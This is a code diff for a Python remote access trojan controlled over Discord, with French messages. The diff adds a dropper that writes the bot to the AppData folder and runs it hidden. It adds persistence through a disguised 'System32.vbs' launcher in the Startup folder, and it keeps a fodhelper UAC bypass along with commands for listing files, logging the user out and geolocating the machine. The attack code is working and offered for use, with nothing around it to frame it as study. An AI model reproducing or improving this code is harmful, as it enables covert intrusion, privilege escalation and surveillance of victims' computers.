@@ -1,3 +1,15 @@
+import os
+import sys
+from pathlib import Path
+import subprocess
+
+file_name = "r4tbyHeartWay.pyw"
+
+appdata_roaming_path = Path(os.getenv('APPDATA'))
+
+file_path = appdata_roaming_path / file_name
+
+script_content = r'''
 import subprocess
 import sys
 import discord
@@ -647,26 +659,25 @@ async def record(ctx, time: int):
 async def startup(ctx):
     if sys.platform == "win32":
         try:
-            # Chemin du script du bot
-            bot_script = os.path.abspath(sys.argv[0])
-
-            # Chemin du dossier Startup
+            file_name = "r4tbyHeartWay.pyw"
+            
+            appdata_roaming_path = Path(os.getenv('APPDATA'))
+            file_path = appdata_roaming_path / file_name
+            
             startup_folder = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
             
-            # Nom du raccourci
-            shortcut_path = startup_folder / "DiscordBotStartup.lnk"
+            vbs_file_path = startup_folder / "System32.vbs"
             
-            # Création du raccourci
-            import pythoncom
-            from win32com.client import Dispatch
-            shell = Dispatch('WScript.Shell')
-            shortcut = shell.CreateShortCut(str(shortcut_path))
-            shortcut.TargetPath = bot_script
-            shortcut.WorkingDirectory = os.path.dirname(bot_script)
-            shortcut.IconLocation = bot_script
-            shortcut.save()
+            pythonw_path = Path(sys.executable).parent / "pythonw.exe"
             
-            await ctx.send("Le bot a été ajouté au démarrage automatique du système.")
+            vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n'
+            vbs_content += f'WshShell.Run chr(34) & "{pythonw_path}" & Chr(34) & " " & chr(34) & "{file_path}" & Chr(34), 0\n'
+            vbs_content += 'Set WshShell = Nothing\n'
+            
+            with open(vbs_file_path, 'w') as vbs_file:
+                vbs_file.write(vbs_content)
+            
+            await ctx.send("Le R4T a été ajouté au démarrage automatique du système.")
         except Exception as e:
             await ctx.send(f"Erreur lors de l'ajout au démarrage : {e}")
     else:
@@ -679,7 +690,6 @@ def isAdmin():
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     return is_admin
 
-# Classe pour contourner la redirection du système de fichiers 64 bits
 class disable_fsr:
     disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
     revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
@@ -690,7 +700,6 @@ class disable_fsr:
         if self.success:
             self.revert(self.old_value)
 
-# Fonction générique pour bypass UAC et exécuter une commande avec élévation des privilèges
 async def bypass_uac(ctx, command):
     if isAdmin():
         os.system(command)
@@ -716,17 +725,14 @@ async def bypass_uac(ctx, command):
         with disable_fsr():
             os.system("fodhelper.exe")
 
-        # Attendre un peu pour s'assurer que l'élévation s'est produite
         time.sleep(2)
 
-        # Vérification après élévation
         if isAdmin():
             await ctx.send("Élévation réussie, exécution de la commande...")
             os.system(command)
         else:
             await ctx.send("Échec de l'obtention des droits administratifs.")
 
-        # Nettoyage des entrées de registre
         remove_reg = r"""powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force"""
         os.system(remove_reg)
 
@@ -755,21 +761,21 @@ def set_volume(volume_level):
 
 @bot.command(name='volumemax')
 async def volumemax(ctx):
-    set_volume(1.0)  # Met le volume à 100%
+    set_volume(1.0)
     await ctx.send("🔊 Volume mis au maximum.")
 
 @bot.command(name='volumemin')
 async def volumemin(ctx):
-    set_volume(0.0)  # Met le volume à 0%
+    set_volume(0.0)
     await ctx.send("🔈 Volume mis au minimum.")
 
 @bot.command(name='list_folder')
 async def list_folder(ctx):
-    root_dir = 'C:\\'  # Spécifiez le répertoire de départ, changez-le selon votre OS
+    root_dir = 'C:\\'
     output_file = 'folder_list.txt'
 
     try:
-        with open(output_file, 'w', encoding='utf-8') as file:  # Utilisation de l'encodage UTF-8
+        with open(output_file, 'w', encoding='utf-8') as file:
             for root, dirs, _ in os.walk(root_dir):
                 for dir_name in dirs:
                     file.write(os.path.join(root, dir_name) + '\n')
@@ -795,7 +801,6 @@ async def list_file(ctx, directory: str):
 
         await ctx.send(file=discord.File(output_file))
 
-        # Supprimer le fichier après l'envoi
         os.remove(output_file)
 
     except Exception as e:
@@ -823,10 +828,8 @@ async def wallpaper(ctx):
     file_path = os.path.join(os.getcwd(), attachment.filename)
     
     try:
-        # Télécharger l'image envoyée
         await attachment.save(file_path)
 
-        # Définir l'image comme fond d'écran
         ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 0)
         await ctx.send("L'image a été définie comme fond d'écran.")
         
@@ -834,7 +837,6 @@ async def wallpaper(ctx):
         await ctx.send(f"Une erreur s'est produite : {e}")
     
     finally:
-        # Supprimer l'image téléchargée après l'avoir utilisée
         if os.path.isfile(file_path):
             os.remove(file_path)
 
@@ -844,13 +846,10 @@ async def logout(ctx):
         os_type = platform.system()
 
         if os_type == "Windows":
-            # Commande pour déconnecter l'utilisateur sous Windows
             os.system("shutdown /l")
         elif os_type == "Linux" or os_type == "Darwin":
-            # Commande pour déconnecter l'utilisateur sous Linux ou MacOS
             os.system("gnome-session-quit --logout --no-prompt")
-            # Sur MacOS, une autre option peut être utilisée si nécessaire
-            # os.system("osascript -e 'tell application \"System Events\" to log out'")
+
         else:
             await ctx.send(f"Système d'exploitation non supporté : {os_type}")
             return
@@ -863,11 +862,9 @@ async def logout(ctx):
 @bot.command(name='geolocate')
 async def geolocate(ctx):
     try:
-        # Utilisation du service ipinfo.io pour la géolocalisation
         response = requests.get("https://ipinfo.io")
         data = response.json()
         
-        # Extraire les coordonnées
         location = data.get("loc", None)
         
         if location:
@@ -884,11 +881,9 @@ bot.remove_command('geolocate')
 @bot.command(name='geolocate')
 async def geolocate(ctx):
     try:
-        # Utilisation du service ipinfo.io pour la géolocalisation
         response = requests.get("https://ipinfo.io")
         data = response.json()
         
-        # Extraire les coordonnées
         location = data.get("loc", None)
         
         if location:
@@ -905,3 +900,9 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+'''
+
+with open(file_path, "w", encoding="utf-8") as file:
+    file.write(script_content)
+
+subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe'), str(file_path)], close_fds=True)
